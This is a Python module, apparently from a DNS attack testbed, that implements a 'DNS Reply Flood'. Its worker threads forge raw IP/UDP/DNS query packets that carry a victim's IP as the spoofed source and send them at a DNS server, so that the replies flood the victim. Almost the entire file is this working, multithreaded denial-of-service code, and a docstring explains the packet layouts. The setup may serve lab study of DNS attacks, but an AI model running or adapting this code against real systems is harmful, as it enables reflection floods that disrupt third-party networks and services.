import os
import sys
import socket
import struct
import random
import time
import threading
import string

current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from attack_strategy import AttackStrategy
except ImportError:
    from .attack_strategy import AttackStrategy

"""
DNS Reply Flood Attack Implementation

This attack floods a DNS server with massive volumes of legitimate-looking DNS queries,
spoofing the target IP as the source. It mixes queries for:
- Existing domains in the zone file (legitimate)
- Valid but not present domains (e.g., other real domains)

The goal is to overwhelm the server and generate a large number of replies to the spoofed target IP.

NS-3 STYLE PACKET CONSTRUCTION DETAILS:
=======================================

1. IP HEADER (20 bytes) - WITH SPOOFING:
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Source Address (SPOOFED)                   |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

2. UDP HEADER (8 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |            Length             |           Checksum            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   - Source Port: random (spoofed)
   - Destination Port: DNS server port (usually 53)
   - Length: 8 + DNS packet length
   - Checksum: computed (with pseudo-header)

3. DNS HEADER (12 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Transaction ID                           |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |QR|   Opcode  |AA|TC|RD|RA|   Z    |        RCODE             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    QDCOUNT (Questions)                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    ANCOUNT (Answers)                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    NSCOUNT (Authority)                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    ARCOUNT (Additional)                       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   - Transaction ID: random
   - QR: 0 (Query)
   - Opcode: 0 (Standard Query)
   - AA: 0 (Not Authoritative)
   - TC: 0 (Not Truncated)
   - RD: 1 (Recursion Desired)
   - RA: 0 (Recursion Available - not set in queries)
   - Z: 000 (Reserved bits)
   - RCODE: 0000 (No error)
   - QDCOUNT: 1 (One question)
   - ANCOUNT: 0 (No answers in query)
   - NSCOUNT: 0 (No authority records in query)
   - ARCOUNT: 0 (No additional records in query)

4. DNS QUESTION SECTION (Variable length):
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   /                     QNAME                     /
   /                                               /
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   |                     QTYPE                     |
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   |                     QCLASS                    |
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

   QNAME Format (domain name encoding):
   - Length-prefixed labels: 3www7example3com0
   - Each label prefixed by its length (1 byte)
   - Terminated by null byte (0x00)
   Example: "www.example.com" -> b'\x03www\x07example\x03com\x00'

   QTYPE: 1 (A record - IPv4 address), 28 (AAAA), 15 (MX), 5 (CNAME), 2 (NS), 16 (TXT)
   QCLASS: 1 (IN - Internet class)

"""

class DNSReplyFlood(AttackStrategy):
    def __init__(
        self,
        server_ip,
        server_port,
        target_ip,
        target_port=12345,
        duration=60,
        threads=20,
        zone_file_path=None,
        valid_domains=None,
        query_types=None,
    ):
        super().__init__(server_ip, server_port, duration, threads)
        self.spoofed_ip = target_ip
        self.spoofed_port = target_port
        self.zone_file_path = zone_file_path or os.path.join(
            os.path.dirname(__file__), '../dns_server/zones/primary.zone')
        self.legit_domains = self._load_zone_domains()
        self.valid_domains = valid_domains or [
            "google.com", "facebook.com", "twitter.com", "github.com",
            "stackoverflow.com", "microsoft.com", "amazon.com"
        ]
        self.query_types = query_types or [1, 28, 15, 5, 2, 16]  # A, AAAA, MX, CNAME, NS, TXT

    def _load_zone_domains(self):
        domains = []
        try:
            with open(self.zone_file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('$'):
                        continue
                    parts = line.split()
                    if len(parts) >= 1:
                        domain = parts[0]
                        if domain.endswith('.'):
                            domain = domain[:-1]
                        domains.append(domain)
        except Exception as e:
            self.logger.warning(f"Could not load zone file: {e}")
        return domains

    # Removed _generate_random_subdomain

    def _pick_query_domain(self):
        r = random.random()
        if r < 0.5 and self.legit_domains:
            # 50%: Legitimate domain from zone
            return random.choice(self.legit_domains)
        else:
            # 50%: Valid but not in zone
            return random.choice(self.valid_domains)

    def _encode_domain_name(self, domain):
        encoded = b""
        labels = domain.split(".")
        for label in labels:
            if len(label) > 63:
                raise ValueError(f"Label too long: {label}")
            encoded += bytes([len(label)]) + label.encode("ascii")
        encoded += b"\x00"
        return encoded

    def _create_dns_header(self):
        transaction_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query, recursion desired
        qdcount = 1
        ancount = 0
        nscount = 0
        arcount = 0
        dns_header = struct.pack(
            "!HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount
        )
        return dns_header, transaction_id

    def _create_dns_question(self, domain, qtype=1, qclass=1):
        encoded_domain = self._encode_domain_name(domain)
        question = encoded_domain + struct.pack("!HH", qtype, qclass)
        return question

    def _create_dns_query_packet(self, domain, qtype=1):
        dns_header, transaction_id = self._create_dns_header()
        dns_question = self._create_dns_question(domain, qtype)
        dns_packet = dns_header + dns_question
        self.logger.debug(
            f"Created DNS query for {domain} (type {qtype}), size: {len(dns_packet)} bytes, TXN ID: {transaction_id}"
        )
        return dns_packet

    def _create_ip_header(self, source_ip, dest_ip, total_length):
        version = 4
        ihl = 5
        tos = 0
        identification = random.randint(1, 65535)
        flags = 0x4000  # Don't Fragment
        fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(dest_ip)
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            tos,
            total_length,
            identification,
            flags | fragment_offset,
            ttl,
            protocol,
            check,
            saddr,
            daddr,
        )
        return ip_header

    def _create_udp_header(self, source_port, dest_port, udp_length):
        checksum = 0
        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)
        return udp_header

    def _calculate_udp_checksum(self, source_ip, dest_ip, udp_header, udp_data):
        pseudo_header = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip),
            0,
            socket.IPPROTO_UDP,
            len(udp_header) + len(udp_data),
        )
        checksum_data = pseudo_header + udp_header + udp_data
        return self.checksum(checksum_data)

    def _create_complete_packet(self, source_ip, dest_ip, source_port, dest_port, dns_packet):
        udp_length = 8 + len(dns_packet)
        total_length = 20 + udp_length
        udp_header = self._create_udp_header(source_port, dest_port, udp_length)
        udp_checksum = self._calculate_udp_checksum(source_ip, dest_ip, udp_header, dns_packet)
        udp_header = struct.pack(
            "!HHHH", source_port, dest_port, udp_length, udp_checksum
        )
        ip_header = self._create_ip_header(source_ip, dest_ip, total_length)
        packet = ip_header + udp_header + dns_packet
        return packet

    def _send_dns_query(self, spoofed_ip, spoofed_port, domain, qtype):
        try:
            dns_packet = self._create_dns_query_packet(domain, qtype)
            complete_packet = self._create_complete_packet(
                spoofed_ip, self.target_ip, spoofed_port, self.target_port, dns_packet
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(complete_packet, (self.target_ip, 0))
            sock.close()
            self.packets_sent += 1
            self.logger.debug(
                f"Sent DNS query for {domain} from spoofed {spoofed_ip}:{spoofed_port}"
            )
            return True
        except Exception as e:
            self.logger.error(f"Error sending DNS query: {e}")
            return False

    def _check_privileges(self):
        return self._check_raw_socket_privileges(socket.IPPROTO_UDP)

    def _start_worker_threads(self):
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._dns_flood_worker, name=f"DNSReplyFlood-{i}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        return threads

    def _dns_flood_worker(self):
        thread_id = threading.current_thread().ident
        self.logger.debug(f"DNS reply flood worker thread {thread_id} started")
        while self.attack_active:
            try:
                domain = self._pick_query_domain()
                qtype = random.choice(self.query_types)
                spoofed_port = random.randint(1024, 65535)
                self.logger.debug(
                    f"Thread {thread_id}: Querying {domain} (type {qtype}) from spoofed {self.spoofed_ip}:{spoofed_port}"
                )
                self._send_dns_query(self.spoofed_ip, spoofed_port, domain, qtype)
                time.sleep(0.01)
            except Exception as e:
                self.logger.error(f"Error in DNS reply flood worker thread {thread_id}: {e}")
                continue
        self.logger.debug(f"DNS reply flood worker thread {thread_id} stopped")

    def _monitor_attack_progress(self, start_time):
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                rate_color = self._get_rate_color(rate)
                progress_msg = f"Elapsed: {elapsed:.1f}s | DNS Queries: {self.packets_sent} | Rate: {rate:.1f} qps"
                self._print_colored(f"\r{progress_msg}", rate_color, end="")
                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                    self.logger.info(f"DNS reply flood attack progress - {progress_msg}")
                time.sleep(1)
        except KeyboardInterrupt:
            self._print_warning("\nDNS reply flood attack interrupted by user")
            self.logger.warning("DNS reply flood attack interrupted by user")

    def attack(self):
        self._display_attack_header()
        self.logger.info(
            f"Starting DNS Reply Flood attack on {self.target_ip}:{self.target_port}, spoofing {self.spoofed_ip}:{self.spoofed_port}"
        )
        self.logger.info(
            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
        )
        self.logger.info(
            f"Legit domains: {len(self.legit_domains)}, Valid domains: {len(self.valid_domains)}, Query types: {len(self.query_types)}"
        )
        self.logger.info(
            "IP SPOOFING ENABLED: Using target IP as spoofed source for each query"
        )
        if not self._check_privileges():
            return
        self.attack_active = True
        start_time = time.time()
        self._print_header("Starting DNS reply flood attack threads...")
        threads = self._start_worker_threads()
        self._print_success(f"✓ {self.threads} DNS reply flood worker threads started")
        self._print_info("DNS Reply Flood in progress... Press Ctrl+C to stop")
        self._monitor_attack_progress(start_time)
        self.attack_active = False
        self._print_info("\nStopping DNS reply flood attack threads...")
        for thread in threads:
            thread.join(timeout=1)
        self._display_attack_completion(start_time)

if __name__ == "__main__":
    import logging
    logging.basicConfig(
        level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
    )
    # Example usage:
    server_ip = "127.0.0.1"  # DNS server IP
    server_port = 53
    target_ip = "192.168.1.100"  # Spoofed victim IP
    target_port = 12345
    attack = DNSReplyFlood(
        server_ip, server_port, target_ip, target_port, duration=10, threads=5
    )
    attack.attack()
